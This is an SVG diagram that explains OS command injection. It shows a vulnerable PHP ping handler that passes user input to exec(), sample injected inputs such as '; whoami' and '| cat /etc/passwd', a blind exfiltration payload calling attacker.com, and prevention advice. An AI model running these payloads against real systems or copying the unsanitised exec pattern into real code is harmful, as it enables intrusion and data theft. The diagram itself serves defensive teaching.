<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>

    <linearGradient id="grad-accent" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e88e5" />
      <stop offset="100%" stop-color="#1565c0" />
    </linearGradient>
    <marker id="arrow-accent" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0" />
    </marker>
  </defs>
  <rect x="40" y="49.062547" width="206.557377" height="117.812554" rx="6.518573" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="143.278689" y="76.250077" font-family="Arial,sans-serif" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Attacker Input</text>
  <text x="59.672131" y="99.812521" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">127.0.0.1; whoami</text>
  <text x="59.672131" y="117.937616" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">| cat /etc/passwd</text>
  <text x="59.672131" y="136.062598" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">&amp;&amp; id</text>
  <text x="59.672131" y="156.000067" font-family="monospace" font-size="11.329714" fill="var(--text-muted)">`ls -la`</text>
  <line x1="246.557377" y1="107.968768" x2="315.409836" y2="107.968768" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="280.983502" y="98.906333" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle">HTTP GET/POST</text>
  <rect x="315.409836" y="40" width="265.57377" height="154.062407" rx="6.518573" fill="var(--warn-fill)" filter="url(#shadow)" stroke="var(--warn-border)" stroke-width="2" />
  <rect x="315.409836" y="40" width="265.57377" height="32.624991" rx="6.518573" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <rect x="315.409836" y="61.750069" width="265.57377" height="10.875034" fill="var(--warn-fill)" rx="6.518573" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="448.196721" y="60.843882" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle">Web Application</text>
  <text x="335.081967" y="90.750086" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">$host = $_GET['host'];</text>
  <text x="335.081967" y="107.062581" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">$cmd = "ping -c 1 " . $host;</text>
  <text x="335.081967" y="123.375077" font-family="monospace" font-size="10.864288" fill="var(--danger-accent)">exec($cmd, $output);</text>
  <text x="335.081967" y="144.218846" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">No sanitisation!</text>
  <text x="335.081967" y="160.531341" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Unsanitised input → shell string</text>
  <line x1="580.983607" y1="117.031316" x2="649.836066" y2="117.031316" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="615.409836" y="107.968768" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--text-muted)" text-anchor="middle">shell call</text>
  <rect x="649.836066" y="49.062547" width="314.753993" height="154.062407" rx="6.518573" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <rect x="649.836066" y="49.062547" width="314.753993" height="32.624991" rx="6.518573" fill="var(--ok-accent)" />
  <rect x="649.836066" y="70.812616" width="314.753993" height="10.875034" fill="var(--ok-accent)" rx="6.518573"/>
  <text x="807.213115" y="69.906317" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle">Shell (/bin/sh)</text>
  <text x="669.508197" y="101.62512" font-family="monospace" font-size="11.329714" fill="var(--text)">$ ping -c 1 127.0.0.1; whoami</text>
  <text x="669.508197" y="123.375077" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Parsed as TWO commands:</text>
  <text x="669.508197" y="141.500059" font-family="monospace" font-size="11.329714" fill="var(--ok-accent)">  ping -c 1 127.0.0.1</text>
  <text x="669.508197" y="157.812554" font-family="monospace" font-size="11.329714" fill="var(--danger-accent)">  whoami              ← injected!</text>
  <text x="669.508197" y="190.437545" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--text-muted)">Runs as web server user (www-data/apache)</text>
  <line x1="964.590164" y1="126.093863" x2="1033.442518" y2="126.093863" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="999.016289" y="117.031316" font-family="Arial,sans-serif" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle">syscall</text>
  <rect x="1033.442518" y="67.18753" width="206.557377" height="99.68746" rx="6.518573" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="1136.721311" y="97.093734" font-family="Arial,sans-serif" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">OS</text>
  <text x="1136.721311" y="117.031316" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" text-anchor="middle">www-data</text>
  <text x="1136.721311" y="136.968898" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle">output returned</text>
  <text x="1136.721311" y="153.281393" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle">to attacker</text>
  <rect x="40" y="221.250049" width="580.327764" height="181.249937" rx="6.518573" fill="var(--surface)" stroke="var(--border)" stroke-width="1" />
  <text x="330.163934" y="246.62498" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Shell Metacharacters Used in Injection</text>
  <rect x="59.672131" y="257.500014" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
  <text x="89.180328" y="274.718809" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">;</text>
  <text x="123.606557" y="274.718809" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Command separator — always runs next command</text>
  <rect x="59.672131" y="286.500031" width="545.901639" height="25.375043" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="89.180328" y="303.718714" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">|</text>
  <text x="123.606557" y="303.718714" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
  <rect x="59.672131" y="315.500048" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
  <text x="89.180328" y="332.718843" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">&amp;&amp;</text>
  <text x="123.606557" y="332.718843" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
  <rect x="59.672131" y="344.499952" width="545.901639" height="25.375043" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="89.180328" y="361.718747" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">||</text>
  <text x="123.606557" y="361.718747" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">OR — cmd2 only if cmd1 fails</text>
  <rect x="59.672131" y="373.500082" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
  <text x="89.180328" y="390.718652" font-family="monospace" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold">` `  or $( )</text>
  <text x="172.786885" y="390.718652" font-family="Arial,sans-serif" font-size="12.273821" fill="var(--text)">Backticks / subshell — command substitution</text>
  <rect x="649.836066" y="221.250049" width="590.163934" height="181.249937" rx="6.518573" fill="var(--surface)" stroke="var(--border)" stroke-width="1" />
  <text x="944.917928" y="246.62498" font-family="Arial,sans-serif" font-size="14.162034" font-weight="bold" fill="var(--text)" text-anchor="middle">Blind vs Visible Injection</text>
  <rect x="669.508197" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="797.377049" y="278.343783" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle">Visible (In-Band)</text>
  <text x="689.180328" y="298.281253" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">Output appears in response</text>
  <text x="689.180328" y="316.406348" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; cat /etc/passwd</text>
  <text x="689.180328" y="334.531217" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Response contains file content</text>
  <text x="689.180328" y="352.6562" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Easiest to exploit</text>
  <text x="689.180328" y="370.781295" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Confirm with: echo 1234567890</text>
  <rect x="964.590164" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="1092.459016" y="278.343783" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Blind (Out-of-Band)</text>
  <text x="984.262295" y="298.281253" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">No output in response</text>
  <text x="984.262295" y="316.406348" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; sleep 5</text>
  <text x="984.262295" y="334.531217" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">Time-based detection</text>
  <text x="984.262295" y="352.6562" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">; curl attacker.com/$(id)</text>
  <text x="984.262295" y="370.781295" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">DNS/HTTP out-of-band exfil</text>
  <rect x="40" y="429.687516" width="1199.999895" height="190.312484" rx="6.518573" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="640" y="455.062559" font-family="Arial,sans-serif" font-size="15.106141" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Prevention</text>
  <rect x="59.672131" y="465.937481" width="344.262295" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="231.803279" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Avoid shell execution</text>
  <text x="79.344262" y="506.718719" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Use language APIs not shell commands</text>
  <text x="79.344262" y="524.843702" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">subprocess.run(['ping','-c','1',host])</text>
  <text x="79.344262" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">  (list form — no shell interpretation)</text>
  <text x="79.344262" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Never pass user input to exec/system</text>
  <text x="79.344262" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Use whitelists, not blacklists</text>
  <text x="79.344262" y="595.531144" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Reject inputs not matching regex pattern</text>
  <rect x="433.442623" y="465.937481" width="373.770492" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="620.327869" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Sanitise if shell is unavoidable</text>
  <text x="453.114754" y="506.718719" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">escapeshellarg($input)   # PHP</text>
  <text x="453.114754" y="524.843702" font-family="monospace" font-size="10.864288" fill="var(--text-muted)">shlex.quote(input)       # Python</text>
  <text x="453.114754" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Wrap input in single quotes</text>
  <text x="453.114754" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
  <text x="453.114754" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text-muted)">• Drop non-alphanumeric chars</text>
  <rect x="836.721311" y="465.937481" width="383.606557" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="1028.52459" y="486.78125" font-family="Arial,sans-serif" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Defence-in-depth</text>
  <text x="856.393338" y="506.718719" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Run web server as low-privilege user</text>
  <text x="856.393338" y="524.843702" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Use WAF rules to block metacharacters</text>
  <text x="856.393338" y="542.968684" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• AppArmor / SELinux mandatory access</text>
  <text x="856.393338" y="561.093779" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Containers: restrict /bin and /usr/bin</text>
  <text x="856.393338" y="579.218649" font-family="Arial,sans-serif" font-size="11.329714" fill="var(--text)">• Log all exec() / system() calls</text>
</svg>